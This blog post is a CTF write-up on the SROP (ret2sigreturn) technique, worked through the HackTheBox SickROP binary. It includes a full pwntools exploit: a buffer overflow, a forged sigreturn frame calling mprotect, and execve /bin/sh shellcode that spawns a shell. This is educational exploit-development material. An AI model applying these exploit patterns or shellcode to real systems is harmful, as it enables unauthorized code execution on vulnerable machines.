---
title: "Return to Sigreturn"
date: 2023-09-11
description: "A really simple writeup for an srop challenge."
tag: ["CTF","srop"]
categories: ["CTF"]
image: /assets/posts/2023-09-11-1/9.png
---

How the sigreturn syscall can be used to provide water in a desert.
<!--more-->

# Table of content
1. [Foreword](#foreword)
2. [What and why?](#sigreturn)
3. [Analysis](#analysis)
4. [Landing in sigreturn](#landing)
5. [Return to mprotect](#mprotect)
6. [Full exploit](#full)

### Forward
People alot smarter than me have been inventing techniques for breaking binaries longer than I've been alive. And depending on the situation you find yourself in, there can be some very interesting ways to use a specific technique to achieve great effect and help with predicaments. It also goes to show that the struggle is not always about finding a vulnerability, but doing something actually useful with it. This post is going to go over SROP (ret2sigreturn) a technique that can be used to control registers in an environment where you may not have the appropiate gadgets or ability to do so.

### What and why
Before going over the situations where ret2sigreturn would be useful and what it is, it might first be better to understand what the sigreturn syscall is. Sigreturn is a special syscall that assists the kernel with context switching when handling signals. This means both saving and restoring a process context. Because sigreturn is responsible for restoring context it also has code present that restores the context of each register. It does this via a sigreturn frame, sigreturn's only parameter which holds the values of all registers which sigreturn has to restore. The following is the <a href="https://elixir.bootlin.com/glibc/glibc-2.29/source/sysdeps/mach/hurd/i386/sigreturn.c#L28">internals</a> to see what's happening specifically. 

![](/assets/posts/2023-09-11-1/1.png)

Sigreturn will pop segment registers, general purpose registers, flags and finally ret will restore the program counter. These are all pop instructions since sigreturn expects the sigreturn frame struct to be on the stack at this point. The technique here is crafting our own sigreturn frame and making the syscall to sigreturn. This would give us control over every register. So in an environment which lacks the appropiate gadgets or in which we cannot control something we need to, returning to sigreturn could prove a godsend option. The use-case situation is not dissimilar to the ret2dllresolve technique, in which we return to dllresolve to trick the linker into resolving uninitialized functions into the plt, but usually one of the two will be the obvious path to take compared to the other, say if you have a statically linked binary and there is no resolving. In this situation, not only would ret2dllresolve not be possible, but it would also make srop easier as lots of glibc functions are just wrappers around syscalls and thus there are syscall gadgets.

The main issue with ret2sigreturn, as made apparent by the source, is that it pops **every** register, including special purpose registers like cs and registers we don't nessecarily want to control such as the stack pointer, which might be hard to set to somewhere appropiate without a leak. Because of this, we need to spend time crafting our forged sigreturn frame and consider everything including where we want to set the program counter and dealing with the forced stack pivot. Unlike ret2dllresolve, ret2sigreturn does require we have atleast prior control over the register used for making syscalls (rax on x86-64).

To better illustrate the concept we'll go over the SickROP challenge from HackTheBox.

### Analysis
We are given a statically linked, non-stripped binary with DEP enabled.

![](/assets/posts/2023-09-11-1/2.png)

An initial review of the program reveals that it does not offer much in terms of functionality and only consists of one function (besides statically compiled functions and `_start`). The `vuln` function just reads from stdin and then echos it out to the screen with `write`. Observe in `_start` that this is looped forever.

![](/assets/posts/2023-09-11-1/3.png)

There is a very large buffer overflow, `0x300` is being passed as the size argument to `read` into var_28, which is only 32 bytes. This is likely to give us enough space for the sigreturn frame. Note that the buffer being passed to read (`var_28`) is on vuln's stack frame.

![](/assets/posts/2023-09-11-1/4.png)

Unsuprisingly, this binary does not provide us many gadgets. We do not even have a gadget to control rax, our syscall register. We do however, have syscall gadgets from read and write.

![](/assets/posts/2023-09-11-1/5.png)

We need a way to control the rax gadget for our syscall number. Luckily for us rax is also used to store the return value on x86 and both `read` and `write` return the number of bytes they operated on as the return value. Thus we could send 15 bytes to read to have the right value for rax by the time of the overflow.

### Landing in Sigreturn
We overwwrite the return address at an offset of 40 bytes, but it won't matter if we return to a syscall without the right syscall number for sigreturn (15). My main workaround to get into sigreturn is to add `vuln` to the ROP chain, before the syscall gadget, that way I can set `rax`. So first we return to `vuln` and send 15 bytes, then we return to the syscall gadget.
```python
from pwn import *

vuln = p64(0x000000000040102e)
syscall = p64(0x0000000000401014)

payload = b"A"*40
payload += vuln
payload += syscall

elf = ELF("./sick_rop")
p = elf.process()

gdb.attach(p, "b * 0x000000000040104e") # ret

p.sendline(payload)
p.clean()
p.sendline(b"A"*14)
p.clean()

p.interactive()
```

Following this we can see that we end up at the syscall gadget after having called vuln again and sending it 15 bytes. So rax is set to the sigreturn syscall number.

![](/assets/posts/2023-09-11-1/6.png)

Following the syscall we see that we end up in sigreturn, note how all the registers were set to values from the stack at the time of the call, which were environment variables.

![](/assets/posts/2023-09-11-1/7.png)

Now that we have control over execution flow, we need to actually forge the sigreturn frame to send. Recall that this frame will need to include ALL registers in the respective order. Luckily pwntools provides magic that does this, so we do not have to tediously craft this frame ourselves.

### Return to mprotect
Now that we can control all our needed registers, we can plan out an exploit. Ideally we could just return to `execve`, but the issue is there is no "/bin/sh" string present in the binary, you could easily read this string onto the new stack (which hopefully is somewhere without aslr) or make some other syscalls to get this string into memory, but I just opted to use the sigframe to setup for an `mprotect` syscall. By returning to `mprotect`, we can mark any section of the binary as executable, my plan was to use the sigreturn frame to move the stack somewhere useful in the text section and also make the whole text section executable. That way, after calling `mprotect`, I could return to `vuln` and simply get a shell using shellcode.

As seen my the syscall entry, mprotect takes three arguments. The start address, size and protection flag for the section we'd like to make executable. 

![](/assets/posts/2023-09-11-1/8.png)

I organize the sigreturn frame to make the entire binary section executable passing the arguments according to calling convention. Recall we're using pwntools magic, so ever register we do not specify to pwntools will be defaulted to zero.

![](/assets/posts/2023-09-11-1/9.png)

We set the program counter to the syscall gadget location, which is followed by a ret, so we also need to pivot the stack somewhere that points to the address of the next return location. After randomly running tele on different parts of the text segment, I found an address with a pointer to vuln, which was perfect. 

![](/assets/posts/2023-09-11-1/10.png)

After returning to `vuln` and running vmmap, we can see that the text space is now executable.

![](/assets/posts/2023-09-11-1/11.png)

This doesn't completely solve the string problem though, luckily there is a piece of assembly code present in the statically compiled read/write function.

![](/assets/posts/2023-09-11-1/12.png)

We could simply place the string at the right place on the stack, which will get moved into rsi, which we can then in turn provide shellcode that moves rsi into rdi. We can then have the return address point to our shellcode since it is in an area without address randomization.

![](/assets/posts/2023-09-11-1/13.png)

![](/assets/posts/2023-09-11-1/14.png)

### Full exploit
```python
from pwn import *

vuln = p64(0x000000000040102e)
syscall = p64(0x0000000000401014)

'''
/bin/sh -> rsi
nop sled
mov    al,0x3b
mov    rdi,rsi
xor    rsi,rsi
xor    rdx,rdx
syscall
'''
execve = b"/bin/sh"+b"\x00"+b"\x90\x90\x90\x90\x90\x90\x90\x90"+b"\xB0\x3B\x48\x89\xF7\x48\x31\xF6\x48\x31\xD2\x0F\x05"+b"A"*11 

payload = b"A"*40
payload += vuln
payload += syscall
frame = SigreturnFrame(arch="amd64", kernel="amd64")
frame.rax = 10 # mprotect
frame.rdi = 0x0000000000400000 # addr
frame.rsi = 0x2000+1000 # len
frame.rdx = 7 # prot
frame.rip = u64(syscall)
frame.rsp = 0x00000000004010d8
payload += bytes(frame)

elf = ELF("./sick_rop")
p = elf.process()

#gdb.attach(p, "b * 0x000000000040104e")

p.sendline(payload)
p.recvline()
p.sendline(b"A"*14)
p.recvline()
p.recvline()
p.sendline(execve+p64(0x4010c3))

p.interactive()
```